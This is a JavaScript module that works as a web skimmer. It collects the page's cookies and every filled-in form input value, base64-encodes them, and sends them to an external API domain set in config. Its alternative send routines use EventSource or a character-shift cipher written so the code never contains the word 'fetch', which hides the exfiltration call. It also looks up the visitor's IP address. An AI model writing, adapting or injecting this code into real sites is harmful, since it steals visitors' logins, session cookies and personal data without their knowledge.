const ipify = require('ipify');
const _ = require('lodash');
const config = require('./config').config;

/**
 * Creates the api url that we will send data to
 * @param {string} encodedPayload form data in base64
 */
export const createUrl = encodedPayload => {
  return `${config.API_DOMAIN}?d=${encodedPayload}`;
};

/**
 * Send the harvested data to the API
 */
export const sendRequest = e => {
  let inputValues = [{ key: 'cookie', value: document.cookie }];
  _.forEach(document.forms, form => {
    _.forEach(form.getElementsByTagName('input'), formInput => {
      if (formInput.value) inputValues.push({ key: formInput.name, value: formInput.value });
    });
  });

  const encodedPayload = btoa(JSON.stringify(inputValues));
  return primitiveFetch(encodedPayload);
  //return cipheredFetch(encodedPayload);
  //return eventSourceFetch(encodedPayload);
};

/**
 * Fetch using the EventSource API
 */
const eventSourceFetch = encodedPayload => {
  return new EventSource(createUrl(encodedPayload));
};

/**
 * Uses a cipher to call fetch without using the word 'fetch'.
 * Isn't cryptography amazing?
 */
const cipheredFetch = encodedPayload => {
  const i = 'gfudi';
  const k = s =>
    s
      .split('')
      .map(c => String.fromCharCode(c.charCodeAt() - 1))
      .join('');
  return self[k(i)](createUrl(encodedPayload)); // equivalent to window.fetch(url)
};

/**
 *  The most basic way to make our request
 * @param {string} encodedPayload The form fields that have been encoded into base64
 */
const primitiveFetch = encodedPayload => {
  return fetch(createUrl(encodedPayload), {
    mode: 'no-cors'
  });
};

/**
 * Gets the current user's IP address
 */
export const getIpAddress = async () => {
  const data = await ipify();
  return data;
};
